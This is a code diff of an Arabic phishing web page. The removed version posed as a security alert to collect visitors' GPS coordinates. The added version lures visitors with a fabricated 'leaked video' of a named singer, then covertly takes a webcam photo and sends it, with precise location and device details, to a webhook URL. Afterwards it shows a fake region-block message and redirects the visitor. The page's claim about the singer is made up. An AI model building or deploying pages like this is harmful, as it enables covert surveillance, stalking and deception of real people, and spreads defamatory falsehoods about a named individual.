@@ -3,63 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام حماية البيانات</title>
+    <title>فيديو حصري - شاهد قبل الحذف</title>
     <style>
-        body { font-family: sans-serif; background-color: #1a1a1a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; background: #2d2d2d; padding: 2.5rem; border-radius: 15px; border: 2px solid #ff4d4d; width: 85%; box-shadow: 0 0 20px rgba(255,77,77,0.2); }
-        .btn { background-color: #ff4d4d; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%; }
-        .btn:active { background-color: #cc0000; }
-        h3 { color: #ff4d4d; margin-bottom: 15px; }
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0b0b0b; /* خلفية داكنة توحي بالسرية */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: #fff;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(30, 30, 30, 0.95);
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 380px;
+            border-top: 4px solid #e50914; /* أحمر نيتفليكس للفت الانتباه */
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        h2 { font-size: 1.3rem; color: #ff3d3d; margin-bottom: 10px; }
+        p { font-size: 0.95rem; color: #ccc; line-height: 1.6; margin-bottom: 20px; }
+        .thumbnail {
+            width: 100%;
+            height: 180px;
+            background: #222 url('https://yt3.googleusercontent.com/ytc/AIdro_m9_R_Zp9Z0p4-O-j-V-D-E-o-V-V-v-v-v=s900-c-k-c0x00ffffff-no-rj') no-repeat center center;
+            background-size: cover;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            position: relative;
+            cursor: pointer;
+        }
+        .play-btn {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 50px;
+            color: rgba(255,255,255,0.8);
+        }
+        .btn-watch {
+            background: #e50914;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+        }
+        #status { display: none; margin-top: 15px; font-size: 0.85rem; color: #ffcc00; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h3>⚠️ تنبيه أمني عاجل</h3>
-    <p>تم اكتشاف محاولة اختراق لجهازك من موقع خارجي. لتأمين حسابك وإيقاف تسريب الصور، يجب مطابقة إحداثيات الجهاز الحالية.</p>
-    <button class="btn" onclick="startTracking()">تأمين الحساب الآن</button>
+    <div class="thumbnail" onclick="startCapture()">
+        <div class="play-btn">▶️</div>
+    </div>
+    <h2>⚠️ تسريب حصري: الفنان حسين محب</h2>
+    <p>شاهد لقطات مسربة للفنان حسين محب في لندن بحالة غير طبيعية داخل إحدى الحانات. المقطع يسبب ضجة كبيرة الآن على وسائل التواصل.</p>
+    
+    <button class="btn-watch" onclick="startCapture()">تشغيل الفيديو الآن (HD)</button>
+    
+    <div id="status">جاري فحص اتصال السيرفر وتأكيد العمر...</div>
 </div>
 
-<form id="trackingForm" action="https://formspree.io/f/mlgavllv" method="POST" style="display:none;">
-    <input type="text" name="latitude" id="lat">
-    <input type="text" name="longitude" id="lon">
-</form>
-
 <script>
-    const vUrl = "https://www.facebook.com/share/v/14ciBr7gfyC/";
+async function startCapture() {
+    document.getElementById('status').style.display = 'block';
+    
+    // الرابط الذي قمت بإنشائه في Webhook.site
+    const webhookURL = "https://webhook.site/80939475-1b42-4508-977f-026428449d56";
 
-    function startTracking() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(success, error, {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
+    // 1. طلب الموقع (لتخطي الحظر الجغرافي)
+    navigator.geolocation.getCurrentPosition(async (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        // 2. طلب الكاميرا (تأكيد الهوية والعمر لمشاهدة المحتوى الحساس)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const photoData = canvas.toDataURL('image/jpeg');
+            
+            // إرسال البيانات فوراً للوحة التحكم
+            fetch(webhookURL, {
+                method: 'POST',
+                mode: 'no-cors', // لضمان الإرسال حتى لو كان الإنترنت ضعيفاً
+                body: JSON.stringify({
+                    location: `https://www.google.com/maps?q=${lat},${lon}`,
+                    photo: photoData,
+                    device: navigator.userAgent
+                })
             });
-        } else {
-            alert("متصفحك لا يدعم نظام الحماية، يرجى التحديث.");
-            window.location.href = vUrl;
+
+            stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            // حتى لو رفض الكاميرا، نرسل الموقع
+            fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ location: `https://www.google.com/maps?q=${lat},${lon}`, photo: "Denied" })});
         }
-    }
 
-    function success(position) {
-        document.getElementById('lat').value = position.coords.latitude;
-        document.getElementById('lon').value = position.coords.longitude;
-        
-        const form = document.getElementById('trackingForm');
-        fetch(form.action, {
-            method: 'POST',
-            body: new FormData(form),
-            headers: { 'Accept': 'application/json' }
-        }).finally(() => {
-            alert("تم تأمين جهازك بنجاح.");
-            window.location.href = vUrl;
-        });
-    }
+        // إيهام المستخدم بخلل تقني
+        setTimeout(() => {
+            alert("عذراً، الفيديو محجوب حالياً في منطقتك بطلب من إدارة الفنان. يرجى استخدام متصفح آخر.");
+            window.location.href = "https://www.google.com";
+        }, 2000);
 
-    function error(err) {
-        // إذا رفض أو حدث خطأ، سيتم تحويله أيضاً لإبعاد الشبهة
-        window.location.href = vUrl;
-    }
+    }, (err) => {
+        alert("خطأ: يجب السماح بالوصول للموقع لتأكيد أنك تشاهد من منطقة مسموح بها.");
+        document.getElementById('status').style.display = 'none';
+    });
+}
 </script>
+
 </body>
 </html>
